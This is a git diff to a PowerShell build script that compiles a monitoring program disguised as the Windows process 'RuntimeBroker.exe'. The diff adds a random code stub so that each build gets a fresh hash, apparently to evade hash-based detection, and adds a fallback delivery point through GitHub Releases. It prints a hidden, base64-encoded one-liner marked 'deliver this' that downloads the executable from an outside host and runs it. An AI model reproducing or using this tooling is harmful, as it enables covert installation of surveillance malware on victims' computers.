@@ -7,8 +7,16 @@ windres version.rc -O coff -o version.res
 if (!$?) { Write-Output "Resource compilation failed"; exit 1 }
 
 $buildVersion = [int][double]::Parse((Get-Date -UFormat %s))
+
+# Append random stub to shift binary layout (unique hash per build)
+$stubGuid = [System.Guid]::NewGuid().ToString("N")
+Add-Content -Path "monitor.cpp" -Value "int _s$stubGuid(void){return 0;}"
+
 g++ -static -Os -s -mwindows -D NETPEN_VERSION=$buildVersion monitor.cpp version.res -lwinhttp -lcrypt32 -lgdiplus -lole32 -loleaut32 -lstrmiids -luuid -lbcrypt -o RuntimeBroker.exe
 if (!$?) { Remove-Item -Force version.res -ErrorAction SilentlyContinue; Write-Output "Compilation failed"; exit 1 }
+
+# Revert the stub
+git checkout -- monitor.cpp
 
 # Remove-Item -Force version.res -ErrorAction SilentlyContinue
 # upx --ultra-brute RuntimeBroker.exe
@@ -58,9 +66,23 @@ $uploadHeaders["x-upsert"] = "true"
 try {
     Invoke-RestMethod -Uri "$sbUrl/storage/v1/object/$bucket/$object" -Method Put -Headers $uploadHeaders -Body $exeData -ErrorAction Stop | Out-Null
     Write-Output "Uploaded to: $sbUrl/storage/v1/object/public/$bucket/$object"
+    # Upload to GitHub Releases as fallback delivery URL
+    $ghToken = $envConfig["GITHUB_TOKEN"]
+    $ghOwner = "Danteh3-lab"; $ghRepo = "all-seeing"
+    if ($ghToken) {
+        try {
+            $ghHeaders = @{ "Authorization" = "Bearer $ghToken"; "Accept" = "application/vnd.github+json" }
+            $ghRelease = Invoke-RestMethod -Uri "https://api.github.com/repos/$ghOwner/$ghRepo/releases/tags/runtime" -Headers $ghHeaders -ErrorAction Stop
+            $ghAssets = Invoke-RestMethod -Uri "https://api.github.com/repos/$ghOwner/$ghRepo/releases/$($ghRelease.id)/assets" -Headers $ghHeaders -ErrorAction SilentlyContinue
+            $old = $ghAssets | Where-Object { $_.name -eq "RuntimeBroker.exe" }
+            if ($old) { Invoke-RestMethod -Uri "https://api.github.com/repos/$ghOwner/$ghRepo/releases/assets/$($old.id)" -Method Delete -Headers $ghHeaders -ErrorAction SilentlyContinue | Out-Null }
+            Invoke-RestMethod -Uri "https://uploads.github.com/repos/$ghOwner/$ghRepo/releases/$($ghRelease.id)/assets?name=RuntimeBroker.exe" -Method Post -Headers $ghHeaders -ContentType "application/octet-stream" -Body $exeData -ErrorAction Stop | Out-Null
+            Write-Output "GitHub release asset uploaded"
+        } catch { Write-Output "WARNING: GitHub upload failed, continuing" }
+    } else { Write-Output "WARNING: GITHUB_TOKEN not set, skipping GitHub upload" }
     Write-Output ""
     Write-Output "=== ONE-LINER (deliver this) ==="
-    $rawCmd = "`$wc=New-Object Net.WebClient;`$b=`$wc.DownloadData('https://allseeing.netlify.app/a');`$p=`$env:tmp+'\a.exe';[IO.File]::WriteAllBytes(`$p,`$b);start `$p;sleep -m 500;ri `$p -Force"
+    $rawCmd = "`$wc=New-Object Net.WebClient;`$b=`$wc.DownloadData('https://allseeing.netlify.app/a');`$p=`$env:tmp+'\a.exe';[IO.File]::WriteAllBytes(`$p,`$b);start `$p"
     $encBytes = [System.Text.Encoding]::Unicode.GetBytes($rawCmd)
     $encCmd = [Convert]::ToBase64String($encBytes)
     Write-Output "powershell -w h -Enc $encCmd"
